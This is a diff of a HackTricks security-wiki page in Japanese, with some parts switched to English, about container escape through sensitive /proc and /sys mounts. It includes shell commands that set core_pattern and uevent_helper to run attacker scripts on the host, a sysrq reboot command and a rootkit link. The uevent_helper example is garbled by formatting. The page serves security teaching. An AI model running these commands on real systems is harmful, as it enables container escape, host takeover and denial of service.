@@ -1,16 +1,16 @@
-# 機密マウント
+# Sensitive Mounts
 
 {% hint style="success" %}
-AWSハッキングの学習と実践：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングの学習と実践：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricksをサポートする</summary>
+<summary>Support HackTricks</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出してください。
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
@@ -19,24 +19,24 @@ GCPハッキングの学習と実践：<img src="/.gitbook/assets/grte.png" alt=
 
 {% embed url="https://websec.nl/" %}
 
-`/proc`および`/sys`の適切な名前空間分離なしでの公開は、攻撃面の拡大や情報漏洩など、重大なセキュリティリスクをもたらします。これらのディレクトリには機密ファイルが含まれており、誤って構成されたり、認証されていないユーザーによってアクセスされたりすると、コンテナの脱出、ホストの変更、またはさらなる攻撃を助ける情報の提供につながる可能性があります。たとえば、`-v /proc:/host/proc`を誤ってマウントすると、パスベースの性質によりAppArmor保護がバイパスされ、`/host/proc`が保護されなくなります。
+`/proc` と `/sys` の適切な名前空間の分離なしでの露出は、攻撃面の拡大や情報漏洩を含む重大なセキュリティリスクを引き起こします。これらのディレクトリには、誤って設定されたり、無許可のユーザーによってアクセスされたりすると、コンテナの脱出、ホストの変更、またはさらなる攻撃を助ける情報を提供する可能性のある機密ファイルが含まれています。たとえば、`-v /proc:/host/proc` を誤ってマウントすると、そのパスベースの性質により AppArmor の保護を回避し、`/host/proc` が保護されない状態になります。
 
-**各潜在的な脆弱性の詳細は** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**で見つけることができます。**
+**各潜在的脆弱性の詳細は** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**で確認できます。**
 
-## procfsの脆弱性
+## procfs 脆弱性
 
 ### `/proc/sys`
 
-このディレクトリは通常、`sysctl(2)`を介してカーネル変数を変更するためのアクセスを許可し、いくつかの懸念のあるサブディレクトリを含んでいます。
+このディレクトリは、通常 `sysctl(2)` を介してカーネル変数を変更するためのアクセスを許可し、いくつかの懸念されるサブディレクトリを含んでいます。
 
 #### **`/proc/sys/kernel/core_pattern`**
 
-* [core(5)](https://man7.org/linux/man-pages/man5/core.5.html)で説明されています。
-* 最初の128バイトを引数として使用してコアファイル生成時に実行するプログラムを定義することができます。ファイルがパイプ `|` で始まる場合、コードの実行につながる可能性があります。
-*   **テストと悪用例**:
+* [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) に記載されています。
+* コアファイル生成時に実行するプログラムを定義でき、最初の 128 バイトを引数として使用します。ファイルがパイプ `|` で始まる場合、コード実行につながる可能性があります。
+*   **テストと悪用の例**:
 
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 書き込みアクセスをテスト
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 書き込みアクセスのテスト
 cd /proc/sys/kernel
 echo "|$overlay/shell.sh" > core_pattern # カスタムハンドラを設定
 sleep 5 && ./crash & # ハンドラをトリガー
@@ -44,43 +44,43 @@ sleep 5 && ./crash & # ハンドラをトリガー
 
 #### **`/proc/sys/kernel/modprobe`**
 
-* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で詳細に説明されています。
-* カーネルモジュールローダーへのパスを含み、カーネルモジュールの読み込み時に呼び出されます。
-*   **アクセスの確認例**:
+* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) に詳細が記載されています。
+* カーネルモジュールを読み込むために呼び出されるカーネルモジュールローダーへのパスを含んでいます。
+*   **アクセス確認の例**:
 
 ```bash
-ls -l $(cat /proc/sys/kernel/modprobe) # modprobeへのアクセスを確認
+ls -l $(cat /proc/sys/kernel/modprobe) # modprobe へのアクセスを確認
 ```
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で言及されています。
-* OOM条件が発生したときにカーネルがパニックするかOOMキラーを呼び出すかを制御するグローバルフラグです。
+* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) に参照されています。
+* OOM 条件が発生したときにカーネルがパニックを起こすか、OOM キラーを呼び出すかを制御するグローバルフラグです。
 
 #### **`/proc/sys/fs`**
 
-* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)によると、ファイルシステムに関するオプションと情報が含まれています。
-* 書き込みアクセスを有効にすると、ホストに対するさまざまなサービス拒否攻撃が可能になります。
+* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) に従い、ファイルシステムに関するオプションと情報を含んでいます。
+* 書き込みアクセスは、ホストに対するさまざまなサービス拒否攻撃を可能にします。
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-* マジックナンバーに基づいて非ネイティブバイナリ形式のインタプリタを登録することができます。
-* `/proc/sys/fs/binfmt_misc/register` が書き込み可能である場合、特権昇格やルートシェルアクセスにつながる可能性があります。
-* 関連する悪用と説明:
-* [binfmt\_miscを使用した貧弱なルートキット](https://github.com/toffan/binfmt\_misc)
-* 詳細なチュートリアル: [ビデオリンク](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+* マジックナンバーに基づいて非ネイティブバイナリ形式のインタプリタを登録できます。
+* `/proc/sys/fs/binfmt_misc/register` が書き込み可能な場合、特権昇格やルートシェルアクセスにつながる可能性があります。
+* 関連するエクスプロイトと説明:
+* [Poor man's rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
+* 詳細なチュートリアル: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
-### `/proc`内のその他のファイル
+### その他の `/proc`
 
 #### **`/proc/config.gz`**
 
-* `CONFIG_IKCONFIG_PROC` が有効になっている場合、カーネル構成を公開する可能性があります。
-* 実行中のカーネルの脆弱性を特定するために攻撃者に役立ちます。
+* `CONFIG_IKCONFIG_PROC` が有効な場合、カーネル設定を明らかにする可能性があります。
+* 実行中のカーネルの脆弱性を特定するために攻撃者にとって有用です。
 
 #### **`/proc/sysrq-trigger`**
 
-* Sysrqコマンドを呼び出すことを許可し、即座のシステム再起動やその他の重要なアクションを引き起こす可能性があります。
-*   **ホストの再起動例**:
+* Sysrq コマンドを呼び出すことができ、即座にシステムを再起動したり、他の重要なアクションを引き起こす可能性があります。
+*   **ホストを再起動する例**:
 
 ```bash
 echo b > /proc/sysrq-trigger # ホストを再起動
@@ -89,99 +89,100 @@ echo b > /proc/sysrq-trigger # ホストを再起動
 #### **`/proc/kmsg`**
 
 * カーネルリングバッファメッセージを公開します。
-* カーネルの悪用、アドレスリーク、機密システム情報の提供に役立ちます。
+* カーネルのエクスプロイト、アドレスリーク、機密システム情報の提供に役立ちます。
 
 #### **`/proc/kallsyms`**
 
 * カーネルがエクスポートしたシンボルとそのアドレスをリストします。
-* 特にKASLRを克服するためにカーネル悪用の開発に不可欠です。
-* `kptr_restrict` が `1` または `2` に設定されていると、アドレス情報が制限されます。
-* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で詳細が説明されています。
+* KASLR を克服するためのカーネルエクスプロイト開発に不可欠です。
+* アドレス情報は、`kptr_restrict` が `1` または `2` に設定されている場合に制限されます。
+* 詳細は [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) に記載されています。
 
 #### **`/proc/[pid]/mem`**
 
-* カーネルメモリデバイス `/dev/mem` とのインターフェースです。
-* 歴史的に特権昇格攻撃の脆弱性がありました。
-* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)で詳細が説明されています。
+* カーネルメモリデバイス `/dev/mem` とインターフェースします。
+* 歴史的に特権昇格攻撃に対して脆弱です。
+* 詳細は [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) に記載されています。
 
 #### **`/proc/kcore`**
 
-* ELFコア形式でシステムの物理メモリを表します。
-* 読み取りによりホストシステムや他のコンテナのメモリ内容が漏洩する可能性があります。
-* ファイルサイズが大きいと読み取りの問題やソフトウェアのクラッシュが発生する可能性があります。
-* 2019年の [Dumping /proc/kcore](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) での詳細な使用法。
+* システムの物理メモリを ELF コア形式で表します。
+* 読み取ることでホストシステムや他のコンテナのメモリ内容が漏洩する可能性があります。
+* 大きなファイルサイズは、読み取りの問題やソフトウェアのクラッシュを引き起こす可能性があります。
+* 詳細な使用法は [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) に記載されています。
 
 #### **`/proc/kmem`**
 
 * カーネル仮想メモリを表す `/dev/kmem` の代替インターフェースです。
-* 読み取りと書き込みが可能であり、したがってカーネルメモリの直接的な変更が可能です。
+* 読み取りと書き込みが可能で、カーネルメモリの直接的な変更を許可します。
 
 #### **`/proc/mem`**
 
 * 物理メモリを表す `/dev/mem` の代替インターフェースです。
-* 読み取りと書き込みが可能であり、すべてのメモリの変更には仮想アドレスから物理アドレスを解決する必要があります。
+* 読み取りと書き込みが可能で、すべてのメモリの変更には仮想アドレスを物理アドレスに解決する必要があります。
 
 #### **`/proc/sched_debug`**
 
-* PID名前空間の保護をバイパスしてプロセススケジューリング情報を返します。
-* プロセス名、ID、およびcgroup識別子を公開します。
+* プロセススケジューリング情報を返し、PID 名前空間の保護を回避します。
+* プロセス名、ID、および cgroup 識別子を公開します。
 
 #### **`/proc/[pid]/mountinfo`**
 
 * プロセスのマウント名前空間内のマウントポイントに関する情報を提供します。
 * コンテナの `rootfs` またはイメージの場所を公開します。
 
-### `/sys`の脆弱性
+### `/sys` 脆弱性
 
 #### **`/sys/kernel/uevent_helper`**
 
-* カーネルデバイス `uevents` を処理するために使用されます。
-* `/sys/kernel/uevent_helper` に書き込むと、`uevent` トリガー時に任意のスクリプトが実行される可能性があります。
+* カーネルデバイスの `uevents` を処理するために使用されます。
+* `/sys/kernel/uevent_helper` に書き込むことで、`uevent` トリガー時に任意のスクリプトを実行できます。
 *   **悪用の例**: %%%bash
 
 #### ペイロードを作成
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### コンテナのOverlayFSマウントからホストパスを見つける
+#### コンテナの OverlayFS マウントからホストパスを見つける
 
 host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-#### uevent\_helperを悪意のあるヘルパーに設定
+#### 悪意のあるヘルパーに uevent\_helper を設定
 
 echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-#### ueventをトリガー
+#### uevent をトリガー
 
 echo change > /sys/class/mem/null/uevent
 
-#### 出力を読む
+#### 出力を読み取る
 
 cat /output %%%
+
 #### **`/sys/class/thermal`**
 
-* 温度設定を制御し、DoS攻撃や物理的損傷を引き起こす可能性があります。
+* 温度設定を制御し、DoS 攻撃や物理的損傷を引き起こす可能性があります。
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-* カーネルアドレスを漏洩し、KASLRを危険にさらす可能性があります。
+* カーネルアドレスを漏洩させ、KASLR を危険にさらす可能性があります。
 
 #### **`/sys/kernel/security`**
 
-* `securityfs` インターフェースを収容し、AppArmorのようなLinuxセキュリティモジュールの構成を可能にします。
-* アクセスすることで、コンテナがMACシステムを無効にする可能性があります。
+* `securityfs` インターフェースを保持し、AppArmor のような Linux セキュリティモジュールの設定を許可します。
+* アクセスにより、コンテナがその MAC システムを無効にする可能性があります。
 
-#### **`/sys/firmware/efi/vars` および `/sys/firmware/efi/efivars`**
+#### **`/sys/firmware/efi/vars` と `/sys/firmware/efi/efivars`**
 
-* NVRAM内のEFI変数とやり取りするためのインターフェースを公開します。
-* 誤構成や悪用により、ブリック化したノートパソコンや起動不能なホストマシンにつながる可能性があります。
+* NVRAM 内の EFI 変数と対話するためのインターフェースを公開します。
+* 誤設定や悪用により、ラップトップがブリックされたり、ホストマシンが起動不能になる可能性があります。
 
 #### **`/sys/kernel/debug`**
 
-* `debugfs` はカーネルに対する「ルールのない」デバッグインターフェースを提供します。
-* 制限のない性質から、セキュリティ問題の歴史があります。
+* `debugfs` はカーネルへの「ルールなし」のデバッグインターフェースを提供します。
+* 制限のない性質のため、セキュリティ問題の歴史があります。
 
-### 参考文献
+### References
 
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 * [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
@@ -192,16 +193,16 @@ cat /output %%%
 {% embed url="https://websec.nl/" %}
 
 {% hint style="success" %}
-AWSハッキングの学習と実践:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングの学習と実践: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricksのサポート</summary>
+<summary>Support HackTricks</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や [**telegramグループ**](https://t.me/peass)に**参加**または**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
